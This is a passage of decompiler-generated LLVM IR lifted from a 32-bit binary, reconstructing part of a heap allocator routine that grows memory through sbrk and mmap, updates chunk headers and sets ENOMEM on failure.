  %storemerge.in = phi i32* [ @esi, %dec_label_pc_80542f7 ], [ @ebx, %dec_label_pc_805430b ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8054315 = or i32 %storemerge, 2
  %v1_8054318 = load i32, i32* @ecx, align 4
  %v2_8054318 = add i32 %v1_8054318, 4
  %v3_8054318 = inttoptr i32 %v2_8054318 to i32*
  store i32 %v1_8054315, i32* %v3_8054318, align 4
  %v0_805431b = load i32, i32* @global_var_8064af0.530, align 16
  %v0_8054320 = load i32, i32* @global_var_8064b10.532, align 16
  %v1_8054326 = add i32 %v0_805431b, 1
  %v1_8054327 = load i32, i32* @global_var_8064af8.533, align 8
  %v2_8054327 = sub i32 %v1_8054326, %v1_8054327
  %v8_8054327 = xor i32 %v1_8054327, %v1_8054326
  %v9_8054327 = xor i32 %v2_8054327, %v1_8054326
  %v10_8054327 = and i32 %v9_8054327, %v8_8054327
  %v11_8054327 = icmp slt i32 %v10_8054327, 0
  %v12_8054327 = icmp eq i32 %v2_8054327, 0
  %v13_8054327 = icmp slt i32 %v2_8054327, 0
  store i32 %v1_8054326, i32* @global_var_8064af0.530, align 16
  %v3_8054332 = icmp ne i1 %v13_8054327, %v11_8054327
  %v4_8054332 = or i1 %v12_8054327, %v3_8054332
  %v7_8054332 = select i1 %v4_8054332, i32 %v1_8054327, i32 %v1_8054326
  store i32 %v7_8054332, i32* @global_var_8064af8.533, align 8
  %v0_805433e = load i32, i32* @global_var_8064b04.534, align 4
  %v1_8054343 = load i32, i32* @ebx, align 4
  %v2_8054343 = add i32 %v1_8054343, %v0_805433e
  store i32 %v2_8054343, i32* @global_var_8064b04.534, align 4
  %tmp86 = icmp ule i32 %v2_8054343, %v0_8054320
  %v5_8054350 = select i1 %tmp86, i32 %v0_8054320, i32 %v2_8054343
  store i32 %v5_8054350, i32* @edx, align 4
  %v1_8054353 = load i32, i32* @global_var_8064b08.535, align 8
  %v2_8054353 = add i32 %v1_8054353, %v2_8054343
  store i32 %v5_8054350, i32* @global_var_8064b10.532, align 16
  %v1_805435f = load i32, i32* @global_var_8064b14.536, align 4
  %tmp140 = icmp ule i32 %v2_8054353, %v1_805435f
  %v5_8054365 = select i1 %tmp140, i32 %v1_805435f, i32 %v2_8054353
  store i32 %v5_8054365, i32* %eax.global-to-local, align 4
  store i32 %v5_8054365, i32* @global_var_8064b14.536, align 4
  br label %dec_label_pc_8054221

dec_label_pc_8054376:                             ; preds = %dec_label_pc_80542bc, %dec_label_pc_80542d0.dec_label_pc_8054376_crit_edge, %dec_label_pc_80542ab, %dec_label_pc_8054294
  %v0_8054376 = phi i32 [ %v0_8054376.pre, %dec_label_pc_80542d0.dec_label_pc_8054376_crit_edge ], [ %v0_8054229, %dec_label_pc_80542ab ], [ %v0_8054229, %dec_label_pc_80542bc ], [ %v0_8054229, %dec_label_pc_8054294 ]
  store i32 %v0_8054376, i32* %eax.global-to-local, align 4
  %v1_805437f = add i32 %v0_8054376, 4
  %v2_805437f = inttoptr i32 %v1_805437f to i32*
  %v3_805437f = load i32, i32* %v2_805437f, align 4
  %v1_8054386 = and i32 %v3_805437f, -4
  %v2_8054386 = icmp eq i32 %v1_8054386, 0
  store i32 %v1_8054386, i32* @ebp, align 4
  %v1_805438c = load i32, i32* @global_var_8064ae8.537, align 8
  %v0_8054396 = load i8, i8* @global_var_8064b00.538, align 256
  %v1_8054396 = urem i8 %v0_8054396, 2
  %v2_8054396 = icmp eq i8 %v1_8054396, 0
  %v1_805439d = icmp eq i1 %v2_8054396, false
  %v1_8054386.op = sub i32 0, %v1_8054386
  %v2_8054394.neg = select i1 %v1_805439d, i32 %v1_8054386.op, i32 0
  %v2_805438c = add i32 %v1_8054298, %v1_8054236
  %v4_805439d = add i32 %v2_805438c, %v1_805438c
  %v5_80543a4 = add i32 %v4_805439d, %v2_8054394.neg
  store i32 %v5_80543a4, i32* %eax.global-to-local, align 4
  %v1_80543a8 = sub i32 0, %v0_8054267
  store i32 %v1_80543a8, i32* @edx, align 4
  %v2_80543ac = and i32 %v5_80543a4, %v1_80543a8
  store i32 %v2_80543ac, i32* @esi, align 4
  %tmp87 = icmp slt i32 %v2_80543ac, 1
  br i1 %tmp87, label %dec_label_pc_80543ca, label %dec_label_pc_80543b4

dec_label_pc_80543b4:                             ; preds = %dec_label_pc_8054376
  store i32 %v2_80543ac, i32* %stack_var_-92, align 4
  %v1_80543b8 = call i32 @__GI_sbrk(i32 %v2_80543ac)
  store i32 %v1_80543b8, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v10_80543c3 = icmp eq i32 %v1_80543b8, -1
  store i32 %v1_80543b8, i32* @ebx, align 4
  %v1_80543c8 = icmp eq i1 %v10_80543c3, false
  br i1 %v1_80543c8, label %dec_label_pc_8054421, label %dec_label_pc_80543b4.dec_label_pc_80543ca_crit_edge

dec_label_pc_80543b4.dec_label_pc_80543ca_crit_edge: ; preds = %dec_label_pc_80543b4
  %v0_80543ca.pre = load i8, i8* @global_var_8064b00.538, align 256
  br label %dec_label_pc_80543ca

dec_label_pc_80543ca:                             ; preds = %dec_label_pc_80543b4.dec_label_pc_80543ca_crit_edge, %dec_label_pc_8054376
  %v0_80543f7 = phi i32 [ -1, %dec_label_pc_80543b4.dec_label_pc_80543ca_crit_edge ], [ %v1_80543a8, %dec_label_pc_8054376 ]
  %v0_80543ca = phi i8 [ %v0_80543ca.pre, %dec_label_pc_80543b4.dec_label_pc_80543ca_crit_edge ], [ %v0_8054396, %dec_label_pc_8054376 ]
  %v1_80543ca = urem i8 %v0_80543ca, 2
  %v2_80543ca = icmp eq i8 %v1_80543ca, 0
  br i1 %v2_80543ca, label %dec_label_pc_80543ca.dec_label_pc_80543df_crit_edge, label %dec_label_pc_80543d3

dec_label_pc_80543ca.dec_label_pc_80543df_crit_edge: ; preds = %dec_label_pc_80543ca
  %v0_80543df.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80543df

dec_label_pc_80543d3:                             ; preds = %dec_label_pc_80543ca
  %v2_80543d7 = add i32 %v1_8054386, %v1_8054298
  store i32 %v2_80543d7, i32* %eax.global-to-local, align 4
  %v0_80543d9 = load i32, i32* @esi, align 4
  %v2_80543d9 = add i32 %v0_80543d9, %v2_80543d7
  %v5_80543db = and i32 %v2_80543d9, %v1_80543a8
  store i32 %v5_80543db, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80543df

dec_label_pc_80543df:                             ; preds = %dec_label_pc_80543ca.dec_label_pc_80543df_crit_edge, %dec_label_pc_80543d3
  %v3_80543ea = phi i32 [ %v0_80543df.pre, %dec_label_pc_80543ca.dec_label_pc_80543df_crit_edge ], [ %v5_80543db, %dec_label_pc_80543d3 ]
  store i32 1048576, i32* %eax.global-to-local, align 4
  %tmp88 = icmp ult i32 %v3_80543ea, 1048576
  %v5_80543ea = select i1 %tmp88, i32 1048576, i32 %v3_80543ea
  store i32 %v5_80543ea, i32* @esi, align 4
  %tmp141 = icmp ugt i32 %v5_80543ea, %v1_80542be
  br i1 %tmp141, label %dec_label_pc_80543f7, label %dec_label_pc_805463c

dec_label_pc_80543f7:                             ; preds = %dec_label_pc_80543df
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8054404 = call i32 @mmap(i32 0, i32 %v5_80543ea, i32 3, i32 34, i32 0, i32 0, i32 %v0_80543f7, i32 %v0_80543f7)
  store i32 %v8_8054404, i32* %eax.global-to-local, align 4
  %v10_805440c = icmp eq i32 %v8_8054404, -1
  store i32 %v8_8054404, i32* @ebx, align 4
  br i1 %v10_805440c, label %dec_label_pc_805463c, label %dec_label_pc_8054417

dec_label_pc_8054417:                             ; preds = %dec_label_pc_80543f7
  %v0_8054417 = load i8, i8* @global_var_8064b00.538, align 1
  %v2_8054417 = and i8 %v0_8054417, -2
  store i8 %v2_8054417, i8* @global_var_8064b00.538, align 256
  %v1_805441e = load i32, i32* @esi, align 4
  %v2_805441e = add i32 %v1_805441e, %v8_8054404
  store i32 %v2_805441e, i32* @edx, align 4
  br label %dec_label_pc_8054421

dec_label_pc_8054421:                             ; preds = %dec_label_pc_80543b4, %dec_label_pc_8054417
  %v0_80544e8 = phi i32 [ -1, %dec_label_pc_80543b4 ], [ %v2_805441e, %dec_label_pc_8054417 ]
  %v0_80544f6 = phi i32 [ %v1_80543b8, %dec_label_pc_80543b4 ], [ %v8_8054404, %dec_label_pc_8054417 ]
  %v10_8054421 = icmp eq i32 %v0_80544f6, -1
  br i1 %v10_8054421, label %dec_label_pc_805463c, label %dec_label_pc_805442a

dec_label_pc_805442a:                             ; preds = %dec_label_pc_8054421
  %v0_805442e = load i32, i32* @global_var_8064b08.535, align 8
  %v1_805442e = load i32, i32* @esi, align 4
  %v2_805442e = add i32 %v1_805442e, %v0_805442e
  store i32 %v2_805442e, i32* @global_var_8064b08.535, align 8
  %v2_8054434 = add i32 %v1_8054386, %v0_8054376
  store i32 %v2_8054434, i32* %ecx.global-to-local, align 4
  %v2_8054436 = sub i32 %v0_80544f6, %v2_8054434
  %v7_8054436 = icmp ult i32 %v0_80544f6, %v2_8054434
  %v12_8054436 = icmp eq i32 %v2_8054436, 0
  %v1_8054438 = icmp eq i1 %v12_8054436, false
  br i1 %v1_8054438, label %dec_label_pc_8054451, label %dec_label_pc_805443a

dec_label_pc_805443a:                             ; preds = %dec_label_pc_805442a
  %v10_805443a = icmp eq i32 %v0_80544e8, -1
  %v1_805443d = icmp eq i1 %v10_805443a, false
  br i1 %v1_805443d, label %dec_label_pc_8054451, label %dec_label_pc_805443f

dec_label_pc_805443f:                             ; preds = %dec_label_pc_805443a
  store i32 %v0_8054376, i32* %ecx.global-to-local, align 4
  %v2_8054443 = add i32 %v1_805442e, %v1_8054386
  %v1_8054446 = or i32 %v2_8054443, 1
  store i32 %v1_8054446, i32* %eax.global-to-local, align 4
  store i32 %v1_8054446, i32* %v2_805437f, align 4
  br label %dec_label_pc_805457e

dec_label_pc_8054451:                             ; preds = %dec_label_pc_805443a, %dec_label_pc_805442a
  %v0_8054451 = load i8, i8* @global_var_8064b00.538, align 1
  %v1_8054451 = sext i8 %v0_8054451 to i32
  store i32 %v1_8054451, i32* %eax.global-to-local, align 4
  %v2_8054456 = urem i8 %v0_8054451, 2
  %v3_8054456 = icmp eq i8 %v2_8054456, 0
  br i1 %v3_8054456, label %dec_label_pc_805446a, label %dec_label_pc_805445a

dec_label_pc_805445a:                             ; preds = %dec_label_pc_8054451
  br i1 %v2_8054386, label %dec_label_pc_805446a, label %dec_label_pc_805445e

dec_label_pc_805445e:                             ; preds = %dec_label_pc_805445a
  %v1_8054460 = icmp eq i1 %v7_8054436, false
  br i1 %v1_8054460, label %dec_label_pc_805446a, label %dec_label_pc_8054462

dec_label_pc_8054462:                             ; preds = %dec_label_pc_805445e
  %v1_8054462 = and i32 %v1_8054451, -2
  %v4_8054462 = trunc i32 %v1_8054462 to i8
  store i32 %v1_8054462, i32* %eax.global-to-local, align 4
  store i8 %v4_8054462, i8* @global_var_8064b00.538, align 256
  br label %dec_label_pc_805446a

dec_label_pc_805446a:                             ; preds = %dec_label_pc_805445e, %dec_label_pc_805445a, %dec_label_pc_8054451, %dec_label_pc_8054462
  %v0_805446a = phi i8 [ %v0_8054451, %dec_label_pc_805445e ], [ %v0_8054451, %dec_label_pc_805445a ], [ %v0_8054451, %dec_label_pc_8054451 ], [ %v4_8054462, %dec_label_pc_8054462 ]
  %v1_805446a = urem i8 %v0_805446a, 2
  %v2_805446a = icmp eq i8 %v1_805446a, 0
  br i1 %v2_805446a, label %dec_label_pc_80544e8, label %dec_label_pc_8054473

dec_label_pc_8054473:                             ; preds = %dec_label_pc_805446a
  br i1 %v2_8054386, label %dec_label_pc_8054481, label %dec_label_pc_8054477

dec_label_pc_8054477:                             ; preds = %dec_label_pc_8054473
  store i32 %v2_8054436, i32* %eax.global-to-local, align 4
  %v2_805447b = add i32 %v2_805442e, %v2_8054436
  store i32 %v2_805447b, i32* @global_var_8064b08.535, align 8
  br label %dec_label_pc_8054481

dec_label_pc_8054481:                             ; preds = %dec_label_pc_8054473, %dec_label_pc_8054477
  %v1_8054483 = urem i32 %v0_80544f6, 8
  %v2_8054483 = icmp eq i32 %v1_8054483, 0
  store i32 %v1_8054483, i32* %edx.global-to-local, align 4
  %v1_8054486 = icmp eq i1 %v2_8054483, false
  br i1 %v1_8054486, label %dec_label_pc_805448e, label %dec_label_pc_8054488

dec_label_pc_8054488:                             ; preds = %dec_label_pc_8054481
  store i32 %v0_80544f6, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054498

dec_label_pc_805448e:                             ; preds = %dec_label_pc_8054481
  %v2_8054493 = sub nsw i32 8, %v1_8054483
  store i32 %v2_8054493, i32* %eax.global-to-local, align 4
  %v2_8054495 = add i32 %v2_8054493, %v0_80544f6
  store i32 %v2_8054495, i32* @edi, align 4
  br label %dec_label_pc_8054498

dec_label_pc_8054498:                             ; preds = %dec_label_pc_8054488, %dec_label_pc_805448e
  %v0_80544a5 = phi i32 [ 0, %dec_label_pc_8054488 ], [ %v2_8054493, %dec_label_pc_805448e ]
  %v2_8054498 = add i32 %v1_805442e, %v0_80544f6
  %v2_80544a5 = add i32 %v0_80544a5, %v1_8054386
  store i32 %v2_80544a5, i32* %ecx.global-to-local, align 4
  %v2_80544a8 = add i32 %v2_80544a5, %v2_8054498
  store i32 %v2_80544a8, i32* %edx.global-to-local, align 4
  %v2_80544aa = add i32 %v2_80544a8, %v1_8054298
  %v5_80544ad = and i32 %v2_80544aa, %v1_80543a8
  %v2_80544b4 = sub i32 %v5_80544ad, %v2_80544a8
  store i32 %v2_80544b4, i32* %eax.global-to-local, align 4
  %v2_80544b6 = add i32 %v2_80544b4, %v2_80544a5
  store i32 %v2_80544b6, i32* @esi, align 4
  store i32 %v2_80544b6, i32* %stack_var_-92, align 4
  %v1_80544ba = call i32 @__GI_sbrk(i32 %v2_80544b6)
  store i32 %v1_80544ba, i32* %eax.global-to-local, align 4
  %v10_80544c2 = icmp eq i32 %v1_80544ba, -1
  store i32 %v1_80544ba, i32* %edx.global-to-local, align 4
  %v1_80544c7 = icmp eq i1 %v10_80544c2, false
  br i1 %v1_80544c7, label %dec_label_pc_80544d7, label %dec_label_pc_80544c9

dec_label_pc_80544c9:                             ; preds = %dec_label_pc_8054498
  store i32 0, i32* %stack_var_-92, align 4
  %v1_80544ce = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_80544ce, i32* %eax.global-to-local, align 4
  store i32 %v1_80544ce, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805450b

dec_label_pc_80544d7:                             ; preds = %dec_label_pc_8054498
  %v1_80544d7 = load i32, i32* @ebx, align 4
  %v7_80544d7 = icmp ult i32 %v1_80544ba, %v1_80544d7
  %v1_80544d9 = icmp eq i1 %v7_80544d7, false
  br i1 %v1_80544d9, label %dec_label_pc_8054510, label %dec_label_pc_80544db

dec_label_pc_80544db:                             ; preds = %dec_label_pc_80544d7
  %v0_80544db = load i8, i8* @global_var_8064b00.538, align 1
  %v2_80544db = and i8 %v0_80544db, -2
  store i8 %v2_80544db, i8* @global_var_8064b00.538, align 256
  store i32 %v2_8054498, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80544ef

dec_label_pc_80544e8:                             ; preds = %dec_label_pc_805446a
  %v10_80544e8 = icmp eq i32 %v0_80544e8, -1
  br i1 %v10_80544e8, label %dec_label_pc_80544f3, label %dec_label_pc_80544ed

dec_label_pc_80544ed:                             ; preds = %dec_label_pc_80544e8
  store i32 %v0_80544f6, i32* @edi, align 4
  br label %dec_label_pc_80544ef

dec_label_pc_80544ef:                             ; preds = %dec_label_pc_80544db, %dec_label_pc_80544ed
  %v0_805451047 = phi i32 [ %v2_8054498, %dec_label_pc_80544db ], [ %v0_80544e8, %dec_label_pc_80544ed ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8054510

dec_label_pc_80544f3:                             ; preds = %dec_label_pc_80544e8
  store i32 %v0_80544f6, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_80544fa = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_80544fa, i32* %edx.global-to-local, align 4
  %v1_8054501 = load i32, i32* @ebx, align 4
  %v2_8054501 = sub i32 %v1_80544fa, %v1_8054501
  %v1_8054503 = load i32, i32* @esi, align 4
  %v2_8054503 = sub i32 %v2_8054501, %v1_8054503
  store i32 %v2_8054503, i32* %eax.global-to-local, align 4
  %v0_8054505 = load i32, i32* @global_var_8064b08.535, align 8
  %v2_8054505 = add i32 %v0_8054505, %v2_8054503
  store i32 %v2_8054505, i32* @global_var_8064b08.535, align 8
  br label %dec_label_pc_805450b

dec_label_pc_805450b:                             ; preds = %dec_label_pc_80544c9, %dec_label_pc_80544f3
  %v0_805451046 = phi i32 [ %v1_80544ce, %dec_label_pc_80544c9 ], [ %v1_80544fa, %dec_label_pc_80544f3 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8054510

dec_label_pc_8054510:                             ; preds = %dec_label_pc_80544d7, %dec_label_pc_80544ef, %dec_label_pc_805450b
  %v0_8054515 = phi i32 [ %v1_80544ba, %dec_label_pc_80544d7 ], [ %v0_805451047, %dec_label_pc_80544ef ], [ %v0_805451046, %dec_label_pc_805450b ]
  %v10_8054510 = icmp eq i32 %v0_8054515, -1
  br i1 %v10_8054510, label %dec_label_pc_805457e, label %dec_label_pc_8054515

dec_label_pc_8054515:                             ; preds = %dec_label_pc_8054510
  %v1_8054515 = load i32, i32* @edi, align 4
  %v2_8054515 = sub i32 %v0_8054515, %v1_8054515
  store i32 %v2_8054515, i32* %edx.global-to-local, align 4
  %v1_8054517 = load i32, i32* @esi, align 4
  %v2_8054517 = add i32 %v1_8054517, %v2_8054515
  %v1_805451a = or i32 %v2_8054517, 1
  store i32 %v1_805451a, i32* %eax.global-to-local, align 4
  store i32 %v1_8054515, i32* @global_var_80647cc.523, align 4
  %v2_8054523 = add i32 %v1_8054515, 4
  %v3_8054523 = inttoptr i32 %v2_8054523 to i32*
  store i32 %v1_805451a, i32* %v3_8054523, align 4
  %v0_8054526 = load i32, i32* @global_var_8064b08.535, align 8
  %v1_8054526 = load i32, i32* @esi, align 4
  %v2_8054526 = add i32 %v1_8054526, %v0_8054526
  store i32 %v2_8054526, i32* @global_var_8064b08.535, align 8
  br i1 %v2_8054386, label %dec_label_pc_805457e, label %dec_label_pc_8054530

dec_label_pc_8054530:                             ; preds = %dec_label_pc_8054515
  store i32 %v0_8054376, i32* %ecx.global-to-local, align 4
  %v1_8054534 = add i32 %v1_8054386, -12
  %v1_8054537 = and i32 %v1_8054534, -8
  store i32 %v1_8054537, i32* %eax.global-to-local, align 4
  %v1_805453c = or i32 %v1_8054537, 1
  store i32 %v1_805453c, i32* %edx.global-to-local, align 4
  %v5_805453f = icmp ult i32 %v1_8054537, 15
  store i32 %v1_805453c, i32* %v2_805437f, align 4
  %v0_8054545 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054545 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054545 = add i32 %v0_8054545, 4
  %v3_8054545 = add i32 %v2_8054545, %v1_8054545
  %v4_8054545 = inttoptr i32 %v3_8054545 to i32*
  store i32 5, i32* %v4_8054545, align 4
  %v0_805454d = load i32, i32* %ecx.global-to-local, align 4
  %v1_805454d = load i32, i32* %eax.global-to-local, align 4
  %v2_805454d = add i32 %v0_805454d, 8
  %v3_805454d = add i32 %v2_805454d, %v1_805454d
  %v4_805454d = inttoptr i32 %v3_805454d to i32*
  store i32 5, i32* %v4_805454d, align 4
  br i1 %v5_805453f, label %dec_label_pc_805457e, label %dec_label_pc_8054557

dec_label_pc_8054557:                             ; preds = %dec_label_pc_8054530
  %v0_8054557 = load i32, i32* @global_var_8064ae4.539, align 4
  store i32 %v0_8054557, i32* @ebx, align 4
  %v0_805455d = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054562 = add i32 %v0_805455d, 8
  store i32 %v1_8054562, i32* %eax.global-to-local, align 4
  store i32 %v1_8054562, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8064ae4.539, align 4
  %v1_8054570 = call i32 @free(i32 %v1_8054562)
  store i32 %v1_8054570, i32* %eax.global-to-local, align 4
  %v0_8054578 = load i32, i32* @ebx, align 4
  store i32 %v0_8054578, i32* @global_var_8064ae4.539, align 4
  br label %dec_label_pc_805457e

dec_label_pc_805457e:                             ; preds = %dec_label_pc_8054530, %dec_label_pc_8054515, %dec_label_pc_8054510, %dec_label_pc_805443f, %dec_label_pc_8054557
  %v0_805457e = load i32, i32* @global_var_8064b08.535, align 8
  %v0_8054583 = load i32, i32* @global_var_8064b0c.540, align 4
  %v0_805458f = load i32, i32* @global_var_80647cc.523, align 4
  store i32 %v0_805458f, i32* @ebx, align 4
  %tmp89 = icmp ule i32 %v0_805457e, %v0_8054583
  %v5_8054595 = select i1 %tmp89, i32 %v0_8054583, i32 %v0_805457e
  store i32 %v5_8054595, i32* @edx, align 4
  %v1_8054598 = load i32, i32* @global_var_8064b04.534, align 4
  %v2_8054598 = add i32 %v1_8054598, %v0_805457e
  store i32 %v5_8054595, i32* @global_var_8064b0c.540, align 4
  %v1_80545a4 = load i32, i32* @global_var_8064b14.536, align 4
  %tmp90 = icmp ule i32 %v2_8054598, %v1_80545a4
  %v5_80545aa = select i1 %tmp90, i32 %v1_80545a4, i32 %v2_8054598
  store i32 %v5_80545aa, i32* %eax.global-to-local, align 4
  store i32 %v5_80545aa, i32* @global_var_8064b14.536, align 4
  %v1_80545b6 = add i32 %v0_805458f, 4
  %v2_80545b6 = inttoptr i32 %v1_80545b6 to i32*
  %v3_80545b6 = load i32, i32* %v2_80545b6, align 4
  %v1_80545b9 = and i32 %v3_80545b6, -4
  store i32 %v1_80545b9, i32* @ecx, align 4
  %v10_80545bc = icmp ult i32 %v1_80545b9, %v1_8054236
  br i1 %v10_80545bc, label %dec_label_pc_805463c, label %dec_label_pc_80545c2

dec_label_pc_80545c2:                             ; preds = %dec_label_pc_805457e
  store i32 %v1_80542be, i32* %esi.global-to-local, align 4
  %v2_80545c8 = sub i32 %v1_80545b9, %v1_80542be
  store i32 %v2_80545c8, i32* %ecx.global-to-local, align 4
  %v2_80545ca = add i32 %v0_805458f, %v1_80542be
  store i32 %v2_80545ca, i32* @edx, align 4
  %v1_80545cd = or i32 %v1_80542be, 1
  store i32 %v1_80545cd, i32* %eax.global-to-local, align 4
  store i32 %v2_80545ca, i32* @global_var_80647cc.523, align 4
  store i32 %v1_80545cd, i32* %v2_80545b6, align 4
  %v0_80545d9.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80545d9

dec_label_pc_80545d9:                             ; preds = %dec_label_pc_8054244, %dec_label_pc_80545c2
  %v0_80545d9 = phi i32 [ %v5_8054257, %dec_label_pc_8054244 ], [ %v0_80545d9.pre, %dec_label_pc_80545c2 ]
  %v1_80545d9 = or i32 %v0_80545d9, 1
  store i32 %v1_80545d9, i32* @ecx, align 4
  %v0_80545dc = load i32, i32* @ebx, align 4
  %v1_80545dc = add i32 %v0_80545dc, 8
  store i32 %v1_80545dc, i32* %ebx.global-to-local, align 4
  %v1_80545df = load i32, i32* @edx, align 4
  %v2_80545df = add i32 %v1_80545df, 4
  %v3_80545df = inttoptr i32 %v2_80545df to i32*
  store i32 %v1_80545d9, i32* %v3_80545df, align 4
  br label %dec_label_pc_8054649

dec_label_pc_80545e4:                             ; preds = %dec_label_pc_8053ff6
  %v5_80545ea = sub i32 %v1_8053fd9, %v1_80542be
  store i32 %v5_80545ea, i32* %eax.global-to-local, align 4
  %v2_80545ee = add i32 %v0_80540a4118, %v1_80542be
  store i32 %v2_80545ee, i32* @edx, align 4
  %v1_80545f2 = or i32 %v1_80542be, 1
  store i32 %v2_80545ee, i32* @global_var_80647d0.524, align 16
  store i32 %v1_80545f2, i32* %v2_8053fd3, align 4
  %v0_80545fe = load i32, i32* %eax.global-to-local, align 4
  %v1_8054600 = or i32 %v0_80545fe, 1
  store i32 %v1_8054600, i32* @ecx, align 4
  %v0_8054603 = load i32, i32* @edx, align 4
  store i32 %v0_8054603, i32* @global_var_80647dc.541, align 4
  store i32 %v0_8054603, i32* @global_var_80647e0.526, align 32
  %v1_805460f = add i32 %v0_8054603, 8
  %v2_805460f = inttoptr i32 %v1_805460f to i32*
  store i32 ptrtoint (i32* @global_var_80647d4.525 to i32), i32* %v2_805460f, align 4
  %v0_8054616 = load i32, i32* @edx, align 4
  %v1_8054616 = add i32 %v0_8054616, 12
  %v2_8054616 = inttoptr i32 %v1_8054616 to i32*
  store i32 ptrtoint (i32* @global_var_80647d4.525 to i32), i32* %v2_8054616, align 4
  %v0_805461d = load i32, i32* @ecx, align 4
  %v1_805461d = load i32, i32* @edx, align 4
  %v2_805461d = add i32 %v1_805461d, 4
  %v3_805461d = inttoptr i32 %v2_805461d to i32*
  store i32 %v0_805461d, i32* %v3_805461d, align 4
  %v0_8054620 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054620 = load i32, i32* @edx, align 4
  %v3_8054620 = add i32 %v1_8054620, %v0_8054620
  %v4_8054620 = inttoptr i32 %v3_8054620 to i32*
  store i32 %v0_8054620, i32* %v4_8054620, align 4
  br label %dec_label_pc_805462e

dec_label_pc_8054625:                             ; preds = %dec_label_pc_8054005
  store i32 %v1_80542be, i32* %ebx.global-to-local, align 4
  %v0_8054629 = load i32, i32* @ebp, align 4
  %v2_8054629 = or i32 %v1_80542be, 4
  %v3_8054629 = add i32 %v0_8054629, %v2_8054629
  %v4_8054629 = inttoptr i32 %v3_8054629 to i32*
  %v5_8054629 = load i32, i32* %v4_8054629, align 4
  %v6_8054629 = or i32 %v5_8054629, 1
  store i32 %v6_8054629, i32* %v4_8054629, align 4
  br label %dec_label_pc_805462e

dec_label_pc_805462e:                             ; preds = %dec_label_pc_80545e4, %dec_label_pc_8054625
  %v0_805462e = load i32, i32* @ebp, align 4
  %v1_805462e = add i32 %v0_805462e, 8
  store i32 %v1_805462e, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054649

dec_label_pc_8054633:                             ; preds = %dec_label_pc_80540f5
  %v1_8054633 = load i32, i32* @ebx, align 4
  %v2_8054633 = add i32 %v0_8054101, 4
  %v3_8054633 = add i32 %v2_8054633, %v1_8054633
  %v4_8054633 = inttoptr i32 %v3_8054633 to i32*
  %v5_8054633 = load i32, i32* %v4_8054633, align 4
  %v6_8054633 = or i32 %v5_8054633, 1
  store i32 %v6_8054633, i32* %v4_8054633, align 4
  br label %dec_label_pc_8054638

dec_label_pc_8054638:                             ; preds = %dec_label_pc_805410d, %dec_label_pc_8054633
  %v0_8054638 = load i32, i32* @ecx, align 4
  store i32 %v0_8054638, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054649

dec_label_pc_805463c:                             ; preds = %dec_label_pc_80543df, %dec_label_pc_805457e, %dec_label_pc_8054421, %dec_label_pc_80543f7
  %v0_805463c = load i32, i32* %stack_var_-92, align 4
  %v1_805463c = call i32 @__errno_location(i32 %v0_805463c)
  store i32 %v1_805463c, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8054643 = inttoptr i32 %v1_805463c to i32*
  store i32 12, i32* %v1_8054643, align 4
  br label %dec_label_pc_8054649

dec_label_pc_8054649:                             ; preds = %dec_label_pc_8054638, %dec_label_pc_805462e, %dec_label_pc_80545d9, %dec_label_pc_805426f, %dec_label_pc_8054221, %dec_label_pc_8053fa0, %dec_label_pc_805463c
  store i32 %v2_8053ed7, i32* @eax, align 4
  store i32 %v2_8053ed7, i32* %stack_var_-92, align 4
  %v2_8054652 = call i32 @__pthread_return_void(i32 %v2_8053ed7, i32 1)
  store i32 %v2_8054652, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805465a

dec_label_pc_805465a:                             ; preds = %dec_label_pc_8053ef5, %dec_label_pc_8054649
  %v0_805465d = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805465d, i32* %eax.global-to-local, align 4
  %v2_805465f = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805465f, i32* @ebx, align 4
  store i32 %v0_8053ec4, i32* @esi, align 4
  store i32 %v0_8053ec3, i32* @edi, align 4
  store i32 %v0_8053ec2, i32* @ebp, align 4
  ret i32 %v0_805465d

; uselistorder directives
  uselistorder i32 %v0_8054620, { 1, 0 }
  uselistorder i32 %v1_80545a4, { 1, 0 }
  uselistorder i32 %v2_8054598, { 1, 0 }
  uselistorder i32 %v0_8054583, { 1, 0 }
  uselistorder i32 %v0_805457e, { 0, 2, 1 }
  uselistorder i32 %v1_8054515, { 1, 0, 2 }
  uselistorder i32 %v0_8054515, { 1, 0 }
  uselistorder i32 %v2_8054503, { 1, 0 }
  uselistorder i32 %v1_80544ba, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_80544a8, { 1, 0, 2 }
  uselistorder i32 %v2_8054498, { 1, 2, 0 }
  uselistorder i32 %v2_8054493, { 1, 0, 2 }
  uselistorder i32 %v1_8054483, { 2, 1, 0 }
  uselistorder i8 %v0_8054451, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8054434, { 1, 0, 2 }
  uselistorder i32 %v0_80544f6, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v0_80544e8, { 2, 0, 1 }
  uselistorder i32 %v8_8054404, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v5_80543ea, { 1, 0, 2 }
  uselistorder i32 %v3_80543ea, { 1, 0 }
  uselistorder i32 %v1_80543b8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_80543ac, { 2, 1, 0, 3 }
